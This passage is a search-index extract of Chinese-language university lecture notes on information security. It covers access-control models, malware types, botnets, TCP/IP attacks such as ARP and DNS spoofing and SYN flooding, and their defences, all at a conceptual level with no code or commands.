\u53ef\u4ee5\u6709\u4e00\u4e9b\u5e94\u5bf9\u63aa\u65bd\uff0c\u6bd4\u5982\u9650\u5236\u5171\u4eab\u8d44\u6e90\uff08\u8ba9\u4ed6\u4eec\u4ec5\u5728\u540c\u4e00\u4e2a\u5bc6\u7ea7\u5171\u4eab\uff0c\u90a3\u4e48\u5c31\u65e0\u6cd5\u88ab\u5176\u4ed6process\u83b7\u53d6\uff09\uff0c\u548c\u9650\u5236\u5e26\u5bbd\uff08bandwidth\uff09\u4f8b\u5982\u52a0\u5165\u566a\u97f3\u5e72\u6270\u7b49</p> <p>Orange Book \u662f \u7f8e\u56fd\u7684MAC\u6807\u51c6\uff08TCSEC\uff09\uff0c\u4e2d\u56fd\u4e5f\u6709GB17859-1999</p> <p>RBAC</p> <p>DAC\u7684\u5b89\u5168\u592a\u5f31\uff0cMAC\u7684\u5b89\u5168\u592a\u5f3a\uff0c\u5e76\u4e14manage\u7684workload\u90fd\u5f88\u5927</p> <p>RBAC\u662fmodern business \u5bf9\u4e8e\u4fe1\u606f\u5b89\u5168\u7684\u8981\u6c42\u7684\u7ed3\u679c\uff0c\u9700\u8981\u51cf\u8f7b\u5b89\u5168\u7ba1\u7406\u5458\u7684\u5de5\u4f5c\u8d1f\u62c5</p> <p>\u8d77\u6e90\u4e8e\u4e00\u90e8\u5206\u64cd\u4f5c\u7cfb\u7edf\uff0cRBAC\u7ed9\u6bcf\u4e2auser\u4ee5a set of roles,</p> <p>\u4e00\u4e9b\u57fa\u7840\u7684\u6982\u5ff5</p> <p>\u200b\u200b</p> <ul> <li> <p>Role \u6bcf\u4e2arole\u8868\u793a\u4e00\u7ec4user\u88ab\u5173\u8054\u5230\u4e00\u7ec4\u6743\u9650\uff0c\u5c5e\u4e8e\u8fd9\u4e2arole\u7684user\u53ef\u4ee5\u6267\u884c\u76f8\u5173\u7684\u64cd\u4f5c</p> </li> <li> <p>group\u662f\u4e00\u7ec4users</p> </li> <li>role \u4e00\u7ec4user + \u4e00\u7ec4 permission \u662f\u4e2a\u591a\u5bf9\u591a\u7684\u6a21\u578b</li> <li>Relationship \u591a\u5bf9\u591a\uff0cuser\u88ab\u5bf9\u5e94\u5230roles\uff0croles\u88ab\u5bf9\u5e94\u5230\u786e\u5b9a\u7684permission</li> <li>Session User\u5230active role\u7684\u6620\u5c04</li> </ul> <p>Hierarchical RBAC Model</p> <p>\u89d2\u8272\u7ed3\u6784\u5316\u7ee7\u627f\u662f\u4e00\u79cd\u5f88\u81ea\u7136\u7684\u65b9\u5f0f\u53bb\u53cd\u6620\u7ec4\u7ec7\u7684\u8ba4\u8bc1\u548c\u8d23\u4efb</p> <p>\u4f8b\u5982r1\u7ee7\u627f\u4e86r2\uff0cr2\u7684\u6743\u9650\u4e5f\u53d8\u6210\u4e86r1\u7684\u6743\u9650\uff0c\u7ee7\u627f\u5173\u7cfb\u6ee1\u8db3\u79bb\u6563\u4e2d\u7684partial order, \u6709\u8fd9\u4e09\u79cd\u6027\u8d28Reflexive, Transitivity, Antisymmetry</p> <p>Constraint RBAC Model</p> <ul> <li>SSD \u7528\u6237\uff0c\u89d2\u8272\u5206\u914d\u7684\u7ea6\u675f\u5173\u7cfb\uff0c\u4e00\u4e2a\u7528\u6237\u4e0d\u80fd\u540c\u65f6\u5206\u914d\u4e24\u4e2aSSD\u89d2\u8272</li> <li>DSD\uff0c\u4e0d\u540c\u65f6\u95f4\u4e0d\u540c\u6743\u9650</li> </ul> <p>RBAC\u7684\u4f18\u52bf</p> <p>\u200b\u200b</p> <p>The Principle of Security Access Control</p> <ul> <li> <p>Authorization management\u2014\u2014\u51b3\u5b9a\u8c01\u6709\u6743\u53bb\u4fee\u6539 Allowed Access</p> </li> <li> <p>MAC Allow Access\u7531Subject\u548cObject\u7684Security level\u51b3\u5b9a</p> <ul> <li>System security administrator \u786e\u8ba4Subject\u7684Security level</li> <li>Object\u7684Security Level\u7531\u521b\u5efa\u5b83\u7684user/process\u786e\u5b9a</li> <li> <p>DAC \u6709\u591a\u79cd\u7ba1\u7406\u65b9\u6cd5</p> </li> <li> <p>Centrialized management</p> </li> <li>Hierarchical management</li> <li>Ownership management</li> <li>Collaborative management</li> <li>Distributed management</li> <li>RBAC</li> <li>Minimize Rights \u6743\u9650\u6700\u5c0f\u5316\uff0c\u7531root\u7528\u6237\u5206\u914d\u7ed9\u4e09\u7c7b\u7279\u6743\u7528\u6237</li> </ul> </li> <li> <p>System administrator</p> </li> <li>Security administrator</li> <li>Audit administrator</li> <li>P54</li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#internet-and-security","title":"Internet and Security","text":""},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#thompsons-compiler","title":"Thompson's Compiler","text":"<ol> <li>\u4fee\u6539\u4e86\u7f16\u8bd1\u5668\uff0c\u4f7f\u5f97\u5176compile login\u7a0b\u5e8f\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fa\u5b9a\u7684\u5bc6\u7801\u767b\u5f55\u6240\u6709\u8d26\u53f7</li> <li>\u518d\u6b21\u4fee\u6539compiler\uff0c\u4f7f\u5f97\u7f16\u8bd1\u5668\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u81ea\u52a8\u52a0\u4e00\u6bb5\u4ee3\u7801\uff0c\u4f7f\u5f97\u8fd9\u6bb5\u7f16\u8bd1\u5668\u5728\u7f16\u8bd1\u6b63\u5e38\u7f16\u8bd1\u5668\uff0c\u53d8\u6210\u4e00\u4e2a\u6076\u610f\u7f16\u8bd1\u6267\u884c\u6587\u4ef6</li> <li>recompile the compiler</li> <li>delete the source containing</li> </ol> <p>The point\uff1a\u6e90\u4ee3\u7801\u7ea7\u522b(source-level)\u7684\u8ba4\u8bc1\u548c\u68c0\u67e5\u662f\u65e0\u6cd5\u5f7b\u5e95\u4fdd\u62a4\u5b89\u5168\u6027\u7684</p> <p>having source code helps but does not ensure you're safe</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#trojan-concealing-rootkit","title":"Trojan concealing \u2014\u2014 rootkit","text":"<p>rootkit\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f7f\u5f97\u6076\u610f\u7528\u6237\u53ef\u4ee5\u8fdb\u884c\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u63a7\u5236\uff0crootkit\u5c31\u662f\u4e0d\u8ba9\u7ba1\u7406\u5458\u68c0\u6d4b\u5230\u6728\u9a6c\u7b49\u5b58\u5728</p> <p>\u6709\u4e00\u7cfb\u5217\u7684\u4f8b\u5b50</p> <p>detect and remove</p> <ul> <li> <p>\u624b\u52a8remove rootkit\u5bf9\u4e8e\u6b63\u5e38\u7528\u6237\u6765\u8bf4\u662f\u6709\u56f0\u96be\u7684\uff0c\u6240\u4ee5\u6709\u4e9btools\u88ab\u63d0\u4f9b\u7528\u6765\u4fdd\u62a4</p> </li> <li> <p>\u4f46\u662f\u4e00\u4e9b\u5b89\u5168\u8f6f\u4ef6\uff0c\u65e0\u6cd5cope with the rootkit</p> </li> <li>\u6700\u597d\u80fd\u591faccess the raw file system to find and kill the Trojan</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#computer-virus","title":"Computer virus","text":"<p>\u6728\u9a6c\u4e00\u822c\u662f\u4f5c\u4e3a\u72ec\u7acb\u8fdb\u7a0b\u5b58\u5728\uff0c\u800cvirus\u4e00\u822c\u4f9d\u9644\u4e8e\u67d0\u4e2aexe\u6587\u4ef6\u5b58\u5728</p> <ul> <li>the insertion phase \u628a\u81ea\u5df1\u63d2\u5165file</li> <li>the execution phase \u8868\u73b0\u51fa\u67d0\u79cd\u884c\u4e3a</li> </ul> <p>\u4e3e\u4e86\u4e00\u4e9b\u4f8b\u5b50\uff0c\u65e9\u671f\u7684\u75c5\u6bd2\u4ee5\u53ca\u75c5\u6bd2\u7684\u4e00\u7cfb\u5217\u79cd\u7c7b</p> <ul> <li>Boot Sector Infectors \u611f\u67d3\u64cd\u4f5c\u7cfb\u7edf\u542f\u52a8\u7684\u5f15\u5bfc\u533a\uff0c\u78c1\u76d8\u6247\u533a\uff0c\u5f53\u7cfb\u7edf\u7b2c\u4e00\u6b21\u770b\u5230\u8fd9\u4e2adisk\u7684\u65f6\u5019\u6267\u884c</li> <li>Executable Infectors\uff0c\u5176\u4f1a\u5728\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u91cc\u63d2\u5165\u4e00\u4e2avirus code   \u200b\u200b</li> <li>Multipartitle Viruses \u4e0a\u8ff0\u4e24\u79cd\u7684\u96c6\u5408</li> <li>TSR viruses \u5e94\u7528\u7a0b\u5e8f\u7ed3\u675f\u4e4b\u540e\u4ecd\u7136\u5728\u5185\u5b58\u4e2d\u4fdd\u6301\u6d3b\u8dc3\u72b6\u6001 terminate and stay resident</li> <li>Stealth viruses \u9690\u85cf\u6587\u4ef6\u611f\u67d3\u7684\u75c5\u6bd2</li> <li>Encrypted Viruses \u5bf9\u75c5\u6bd2\u8fdb\u884c\u52a0\u5bc6\uff0c\u9632\u6b62\u88ab\u5b89\u5168\u8f6f\u4ef6\u8bc6\u522b\u51fa\u6765\uff0c\u73b0\u5728\u901a\u8fc7\u7b7e\u540d\u68c0\u6d4b\u75c5\u6bd2\u662f\u56f0\u96be\u7684   \u5728\u6709\u9650\u65f6\u95f4\u5185\u68c0\u6d4b\u4efb\u610f\u75c5\u6bd2\u7684\u52a0\u5bc6\uff0c\u662f\u4e0d\u53ef\u80fd\u7684</li> <li>Polymorphic Viruses\uff0c\u6bcf\u6b21\u590d\u5236\u90fd\u4f1a\u6539\u53d8\u5f62\u5f0f\u7684\u75c5\u6bd2</li> </ul> <p>\u75c5\u6bd2\u662f\u5982\u4f55\u611f\u67d3\u7684\uff0c\u4ee5\u53ca\u5982\u4f55\u52a0\u5bc6</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#worm","title":"Worm","text":"<p>\u200b\u200b</p> <p>\u901a\u8fc7\u81ea\u52a8\u62f7\u8d1d\u81ea\u8eab\u5230\u76ee\u6807\u7cfb\u7edf\u6765\u4f20\u64ad</p> <p>\u5148\u662f\u5bf9virus, trojan \u548c worm\u505a\u4e86\u4e00\u4e2a\u6bd4\u8f83\uff0c\u4eceExistance\u548cPropagation</p> <p>Robert Morris release a worm \u7b2c\u4e00\u4e2a\u8815\u866b</p> <p>Code Red 1</p> <p>\u4f7f\u7528Web\u7684\u6f0f\u6d1e</p> <p>Nimda</p> <p>\u662f\u7528Email</p> <p>\u8fd8\u5b58\u5728\u4e00\u4e9b\u5176\u4ed6\u7684\u6076\u610f\u4ee3\u7801\uff0c\u6bd4\u5982\u7528\u4e8e\u8017\u5c3d\u7cfb\u7edf\u8d44\u6e90\u7684\u4e00\u4e9b\u7a0b\u5e8f</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#theory-of-virus-detection","title":"Theory of virus detection","text":"<p>theory of virus detection</p> <p>\u6ca1\u6709\u7b97\u6cd5\u5b8c\u7f8e\u68c0\u6d4b\u6240\u6709virus\u548cmalicious code</p> <p>virus analysis</p> <ul> <li>\u4eba\u529b\u5206\u6790\u75c5\u6bd2</li> <li>\u81ea\u52a8\u5206\u6790\u75c5\u6bd2 immune system   \u200b\u200b</li> </ul> <p>SandBox / virtual machine</p> <p>\u6709\u4e9b\u8bed\u8a00\u8fd0\u884c\u5728\u4e00\u4e9b\u88ab\u4fdd\u62a4\u7684area\uff0c\u4f8b\u5982Java\u8fd0\u884c\u5728JVM</p> <p>js\u8fd9\u79cd\u8bed\u8a00\u662f\u8fd0\u884c\u5728SandBox\uff0c\u6d4f\u89c8\u5668\u7684\u6c99\u76d2\uff0c\u65e0\u6cd5\u8bbf\u95ee\u6d4f\u89c8\u5668\u9650\u5236\u4ee5\u5916\u7684\u5185\u5bb9</p> <p>\u9650\u5236\u4e00\u4e2a\u7a0b\u5e8f\u7684\u53ef\u8bbf\u95ee\u7684\u5bf9\u8c61</p> <p>botnets \u50f5\u5c38\u7f51\u7edc \u4e00\u7ec4\u673a\u5668\u901a\u8fc7\u7f51\u7edc\u5b8c\u6210\u4e00\u4ef6\u4e8b\u60c5\uff0c\u5176\u5728\u7f51\u7edc\u4e0a\u7684\u68c0\u6d4b\u662f\u4e0d\u592a\u53ef\u80fd\u5f97\u3002</p> <p>DDOS distributed denial of service</p> <p>defenses Means</p> <ul> <li> <p>distinguish between data, instruction</p> </li> <li> <p>\u75c5\u6bd2\u5fc5\u987b\u8981\u5199\u5165\u7a0b\u5e8f\uff0c\u53ea\u5141\u8bb8\u5199\u5165data\uff0c\u4e0d\u5141\u8bb8\u6267\u884cdata\uff0c\u6267\u884c\u9700\u8981\u5ba1\u67e5</p> </li> <li> <p>limit object accessible to processes</p> </li> <li> <p>\u63a7\u5236\u7528\u6237\u4e4b\u95f4\u7684\u4fe1\u606f\u6d41\uff0c\u6bd4\u5982\u5728\u6d4f\u89c8\u5668\uff0c\u865a\u62df\u673a\uff0cSandBox\u4e2d\u8fd0\u884c</p> </li> <li>\u4ec5\u7ed9\u4e00\u4e2a\u8fdb\u7a0b\u4ee5\u6700\u4f4e\u6743\u9650\uff0c\u4f7f\u5176\u53ea\u80fd\u6267\u884c\u81ea\u5df1\u7684\u529f\u80fd\uff0c\u4e0d\u80fd\u505a\u591a\u4f59\u7684\u4e8b\u60c5</li> <li> <p>Inhibit sharing</p> </li> <li> <p>\u7981\u6b62\u5171\u4eab\uff0c\u4f7f\u7528\u591a\u5c42\u7684\u5b89\u5168\u673a\u5236</p> </li> <li> <p>detect altering of files</p> </li> <li> <p>\u8ba1\u7b97\u4e00\u4e2a\u6587\u4ef6\u7684MDC\uff0c\u6bcf\u6b21\u4fdd\u5b58\u7684\u65f6\u5019\u90fdcheck\u4e00\u904dMDC\u7684\u503c\u662f\u5426\u76f8\u540c</p> </li> <li> <p>detect actions beyond specification</p> </li> <li> <p>\u68c0\u6d4b\u8d85\u51fa\u89c4\u8303\u7684\u64cd\u4f5c\uff0c\u591a\u7248\u672c\u7f16\u7a0b\u9a8c\u8bc1\u6b63\u786e\u6027</p> </li> <li> <p>Analyze statistical characteristics</p> </li> <li> <p>\u5206\u6790\u7edf\u8ba1\u7279\u5f81</p> </li> </ul> <p>\u200d</p> <p>SPAM</p> <p>\u5783\u573e\u90ae\u4ef6\u592a\u591a</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#botnets-ddos-and-spam","title":"Botnets DDOS and SPAM","text":"<p>botnets</p> <p>network of autonomous programs capable of acting on instructions</p> <p>\u901a\u5e38\u662f\u5927\u578b\u7684\u8fdc\u7a0b\u63a7\u5236\u7684\u50f5\u5c38\u7cfb\u7edf\uff0c\u7528IRC\u7b49\u65b9\u5f0f\u63a7\u5236\u548c\u66f4\u65b0</p> <p>\u50f5\u5c38\u7f51\u7edc\u662f\u5f88\u591a\u653b\u51fb\u7684\u5e73\u53f0</p> <ul> <li>DDOS</li> <li>SPAM</li> <li>\u65b0\u6f0f\u6d1e\u548c\u8815\u866b\u7684\u542f\u52a8\u677f</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u68c0\u67e5\u7528\u6237\u7cfb\u7edf\u7684\u6f0f\u6d1e\uff08buffer overflows, email\u7b49\uff09\uff0c\u5e76\u4e14\u8fdb\u5165\u6267\u884cshellcode</li> <li>shellcode\u4e0b\u8f7dactual bot</li> <li>bot \u7981\u7528\u9632\u706b\u5899\u548c\u6740\u6bd2\u8f6f\u4ef6</li> <li> <p>bot \u5b9a\u4f4dIRC server\uff0c\u8fde\u63a5\u5e76\u4e14\u52a0\u5165channel</p> </li> <li> <p>\u7528DNS\u627e\u5230server</p> </li> <li>\u8ba4\u8bc1\u7801\u5728bot\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\u4e2d</li> <li>bot master \u53d1\u51faAuthenticated command</li> </ul> <p>\u50f5\u5c38\u7f51\u7edc\u7684\u4f20\u64ad</p> <ul> <li>\u6bcf\u4e2abot\u81ea\u5df1\u5c31\u53ef\u4ee5\u626b\u63cfIP\u7a7a\u95f4\u8fdb\u884c\u4f20\u64ad</li> <li>\u4e3b\u52a8\u50f5\u5c38\u7f51\u7edc\u7ba1\u7406</li> </ul> <p>DOS</p> <p>Email Spoofing</p> <p>SMTP\u6ca1\u6709\u5185\u7f6e\u7684\u8ba4\u8bc1\uff0c</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#ip-security","title":"IP security","text":""},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#tcpip-protocol-stack","title":"TCP/IP Protocol Stack","text":"<ul> <li>\u4f7f\u7528TCP/IP\u534f\u8bae\u6808\u6765route\u548cconnect</li> <li>\u4f7f\u7528BGP\u6765router discovery</li> <li>\u4f7f\u7528DNS\u6765\u627e\u5230\u901a\u8fc7\u57df\u540d\u627e\u5230IP address</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>IP Internet Protocol</p> <p>TCP/IP\u4e2d\u7684\u7f51\u7edc\u5c42\u534f\u8bae\uff0c\u7528numeric address \u6570\u5b57\u5316\u7684\u5730\u5740\u6765routing</p> <p>ICMP Control Message Protocol</p> <p>\u5bf9\u4e8e network operation \u63d0\u4f9bfeedback</p> <p>IP &amp; TCP/UDP</p> <p>IP\u8d1f\u8d23\u4f20\u9001</p> <p>TCP\u662f\u4f20\u8f93\u5c42\uff0c\u5bf9\u4e8ereliability and flow control \u8d1f\u8d23</p> <ul> <li>sliding windows</li> <li>sequncing numbers and acknowledgements</li> <li>synchronization</li> </ul> <p>IP\u5305\u4e2d\u6709\u4e00\u4e2aProtocol field\u6765\u660e\u786e\u8fd9\u6bb5\u662fTCP\u8fd8\u662fUDP</p> <p>User Datagram Protocol</p> <p>IP \u63d0\u4f9b routing</p> <p>UDP \u6309\u7167\u7aef\u53e3\u5206\u9694\u6d41\u91cf</p> <p>Minimal guarantees</p> <p>TCP\u4e2d\u5305\u542b</p> <ul> <li> <p>Sender\uff1abreak data into segments</p> </li> <li> <p>sequence number \u9644\u5728\u6bcf\u4e2a\u5305\u4e0a</p> </li> <li> <p>Receiver: \u5c06Segments\u6309\u7167\u6b63\u786e\u7684order\u91cd\u65b0\u88c5\u914d reassemble</p> </li> <li> <p>\u4e22\u5931\u6570\u636e\u91cd\u65b0\u53d1\u9001</p> </li> <li>\u786e\u8ba4\u6536\u5230 acknowledge receipt</li> </ul> <p>\u200b\u200b</p> <p>\u4e09\u6b21\u63e1\u624b</p> <p>\u4e24\u7aef\u9700\u8981\u901a\u8fc7\u5404\u81ea\u7684initial TCP sequence number\u53bb\u5efa\u7acb\u8054\u7cfb</p> <p>Sequence number \u662f\u7528\u6765track packets' order\u4fdd\u8bc1\u6ca1\u6709packets\u88ab\u9057\u6f0f</p> <p>\u200b\u200b</p> <p>port number</p> <p>DNS</p> <p>\u5c06domain name map\u5230numberic IP addresses</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#security-issues-of-tcp-ip","title":"Security issues of TCP / IP","text":"<p>sniffing</p> <p>\u8bb8\u591a\u4f20\u8f93\u7684\u6570\u636e\u4e0d\u662f\u88ab\u52a0\u5bc6\u7684\uff0c\u6bd4\u5982\u4f7f\u7528HTTP\u534f\u8bae\u7684\uff0c\u901a\u8fc7\u4e00\u4e9b\u6293\u5305\u5de5\u5177\uff0c\u6bd4\u5982WireShark\uff0c\u6765\u622a\u53d6\u4fe1\u606f</p> <p>promiscuous mode network interface card can read all data\u6df7\u6742\u6a21\u5f0f\u7f51\u7edc\u63a5\u53e3\u53ef\u4ee5\u83b7\u53d6\u6240\u6709\u4fe1\u606f</p> <p>ARP spoofing</p> <p>ARP\u662f\u5c06IP\u8f6c\u5230MAC\u7684\u8fc7\u7a0b\uff0cOS\u901a\u8fc7ARP cache\u6765\u5b9e\u73b0ARP\uff0c\u4e0d\u540c\u7684\u673a\u5668\u6709\u4e0d\u540c\u7684\u5b9e\u73b0\u65b9\u5f0f\uff0c\u6709\u4e00\u4e9bOS\u53ea\u63a5\u53d7\u7b2c\u4e00\u4e2aresponse package</p> <p>\u901a\u8fc7\u4f2a\u9020\u4e00\u4e2aICMP\u6570\u636e\u5305\uff0c\u8ba9\u67d0\u4e2a\u673a\u5668\u53d1\u8d77ARP\u8bf7\u6c42\uff0c\u518d\u53d1\u9001\u5047ARP\u7684\u76f8\u5e94\uff0c\u4f7f\u5f97ARP\u7f13\u5b58\u88ab\u7834\u574f</p> <p>\u200b\u200b</p> <p>IP spoofing</p> <p>\u5c06\u4e00\u53f0\u673a\u5668\u7684IP\u5730\u5740\uff0c\u66ff\u6362\u6210\u5176\u4ed6\u673a\u5668\u7684IP\u5730\u5740\uff0c\u9690\u85cf\u53d1\u9001\u65b9\u6216\u8005\u5192\u5145\u53e6\u4e00\u4e2a\u8ba1\u7b97\u673a\u8eab\u4efd</p> <p>TCP SYN Flooding</p> <p>\u653b\u51fb\u8005\u5728\u4f2a\u9020IP\u5730\u5740\u7684\u540c\u65f6\uff0c\u53d1\u9001\u5927\u91cf\u8bf7\u6c42\uff0c\u88ab\u653b\u51fb\u7684\u4e3b\u673a\u4f1a\u9700\u8981\u5206\u914d\u8d44\u6e90\uff0c\u4e00\u65e6\u8d44\u6e90\u88ab\u8017\u5c3d\uff0c\u5ba2\u6237\u7aef\u5c31\u65e0\u6cd5\u6b63\u5e38\u8fde\u63a5\u4e86</p> <p>\u8fd9\u662f\u6700\u7ecf\u5178\u7684DOS\u653b\u51fb \u53d1\u8d77\u8005\u4e0d\u6d88\u8017\u8d44\u6e90\uff0c\u63a5\u6536\u65b9\u5fc5\u987b\u4e3a\u6bcf\u4e2a\u8bf7\u6c42\u521b\u9020\u7ebf\u7a0b\uff0c\u975e\u5bf9\u79f0\u7684\u653b\u51fb</p> <p>\u963b\u6b62\u7684\u65b9\u6cd5</p> <ul> <li>\u5f53\u8d44\u6e90\u7528\u5b8c\u4e4b\u540e\uff0c\u968f\u673a\u5220\u9664\u4e00\u4e9b\u7ebf\u7a0b\uff0crandom delete, \u5bb9\u6613\u5b9e\u73b0</li> <li> <p>SYN cookies \u670d\u52a1\u5668\u81f3\u5c11\u6536\u52302\u6761\u4fe1\u606f\u624d\u5b58\u50a8\u72b6\u6001</p> </li> <li> <p>\u670d\u52a1\u5668\u628asocket information \u5b58\u5728cookie\u4e2d\uff0c\u518d\u628acookie\u53d1\u56de\u53bb</p> </li> <li>\u5ba2\u6237\u7aef\u5fc5\u987b\u628a\u8fd9\u4e2acookie\u518d\u53d1\u56de\u53bb\u4e00\u6b21\uff0c\u670d\u52a1\u5668\u91cd\u65b0\u8ba1\u7b97\u4e4b\u540e\u518d\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef</li> <li>\u200b\u200b</li> </ul> <p>TCP SYN Prediction Attack</p> <p>TCP\u7684\u6bcf\u4e2a\u5305\u91cc\u6709\u5e8f\u5217\u53f7SYN\uff0c\u63a5\u6536\u65b9\u5c06\u6392\u5e8f\u4e0e\u6839\u636eSYN\u91cd\u7ec4\u6570\u636e\u5305\uff0c\u5982\u679cTCP\u534f\u8bae\u4e2d\u7684\u5e8f\u5217\u53f7\u88ab\u653b\u51fb\u8005\u9884\u6d4b\uff0c\u90a3\u4e48\u5176\u5c31\u80fd\u4f2a\u9020\u5305\u53d1\u9001\u7ed9\u63a5\u6536\u65b9\uff0c\u4ee5\u8fbe\u6210\u81ea\u5df1\u7684\u76ee\u7684</p> <p>\u8be5\u79cd\u653b\u51fb\u662f\u5f88\u591a\u5176\u4ed6\u653b\u51fb\u7684\u6765\u6e90</p> <ul> <li>TCP spoofing</li> <li>TCP connection hijacking</li> <li>TCP reset</li> </ul> <p>\u4e3b\u8981\u7684\u5bf9\u6297\u9884\u6d4b\u653b\u51fb\u7684\u65b9\u6cd5\u662f\uff0c\u968f\u673a\u751f\u6210SYN\u8ba9prediction\u53d8\u5f97\u4e0d\u53ef\u80fd</p> \\[ ISN = M+F(\u672c\u5730IP\uff0c\u7aef\u53e3\uff0c\u8fdc\u7a0bIP\uff0c\u7aef\u53e3\uff0c\u4fdd\u5bc6\u5bc6\u94a5) \\] <p>\u5176\u4e2dM\u662f\u4e3a\u5fae\u79d2\u5b9a\u65f6\u5668\uff0cF\u4e3a\u4f2a\u968f\u673a\u51fd\u6570\uff0c\u4f7f\u7528\u5355\u5411hash\u51fd\u6570\u5b9e\u73b0</p> <p>TCP congestion control</p> <p>\u5f53\u53d1\u751f\u4e22\u5305\u7684\u65f6\u5019\uff0c\u8bf4\u660enetwork is congested\uff0c\u6b64\u65f6TCP\u534f\u8bae\u8981\u6c42sender</p> <ul> <li>\u901a\u4fe1\u901f\u5ea6\u6301\u7eed\u51cf\u534a\uff0c\u76f4\u5230\u6ca1\u6709\u4e22\u5305\u6216\u8005\u901f\u5ea6\u964d\u4e3a0</li> <li>\u5982\u679c\u4e0d\u518d\u4e22\u5305\u4e86\uff0c\u4f20\u8f93\u901f\u5ea6\u4f1a\u7f13\u6162\u589e\u52a0</li> </ul> <p>\u4f46\u662f\u5982\u679c\u5728\u6709\u6076\u610f\u7528\u6237\u4e0d\u9075\u5b88\u534f\u8bae\uff0c\u5728\u4ed6\u4eba\u548c\u81ea\u5df1\u540c\u65f6\u4e22\u5305\u7684\u65f6\u5019\u53cd\u800c\u589e\u901f\uff0c\u90a3\u4e48\u5c31\u4f1a\u9650\u5236\u4ed6\u4eba\u7684\u901f\u5ea6\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5</p> <ul> <li>Add ack nonces\uff0c\u5728ack\u7684\u65f6\u5019\u8fd4\u56de\u4e00\u4e2anonce\uff0c\u6765\u8bc1\u660e\u5176\u4e0d\u662f\u4e00\u4e2a\u6b3a\u9a97</li> </ul> <p>DNS spoofing</p> <p>\u4fee\u6539DNS\u670d\u52a1\u5668\u6216\u8005\u672c\u5730DNS\u670d\u52a1\uff0c\u4e00\u822c\u5c31\u662f\u4fee\u6539DNS\u7f13\u5b58\u6570\u636e\u5e93\uff0c\u5c06\u9875\u9762\u91cd\u5b9a\u5411\u5230\u9519\u8bef\u7684IP\uff0c\u4e5f\u5373\u5c06\u4fe1\u606f\u53d1\u9001\u5230\u53e6\u4e00\u53f0\u673a\u5668\uff0c\u4e00\u822c\u662f\u653b\u51fb\u8005\u7684\u673a\u5668</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1aDNSSEC</p> <ul> <li>\u5176\u4ea7\u751f\u653b\u51fb\u7684\u539f\u56e0\u662fDNS\u7684\u54cd\u5e94\u548c\u8bf7\u6c42\u662f\u6ca1\u6709\u8ba4\u8bc1\uff08authenticated\uff09\u7684\uff0c\u4f46\u662fDNSSEC\u4f7f\u5f97\u6bcf\u4e00\u6b21\u54cd\u5e94\u90fd\u9700\u8981\u8ba4\u8bc1</li> <li>\u5176\u672c\u8eab\u4e0d\u63d0\u4f9b\u52a0\u5bc6\u670d\u52a1\uff0c\u4e5f\u4e0d\u4f1a\u7528\u5728\u5bf9\u6297DOS\u653b\u51fb\u4e0a</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#ipsec","title":"IPSEC","text":"<p>IPSec\u662f\u652f\u6301\u6240\u6709\u5728IP\u5c42\u7684\u52a0\u5bc6encryption\u548c\u8ba4\u8bc1\u670d\u52a1authentication\uff0c\u5176\u6709\u4e09\u4e2a\u6838\u5fc3\u7ec4\u4ef6</p> <ul> <li>Authentication Header AH \u9a8c\u8bc1\u5934</li> <li>Encapsulating Security Payloads ESP \u8f7d\u8377\u5b89\u5168\u6027\u5c01\u88c5</li> <li>Security Association SA \u5b89\u5168\u5173\u8054</li> </ul> <p>AH</p> 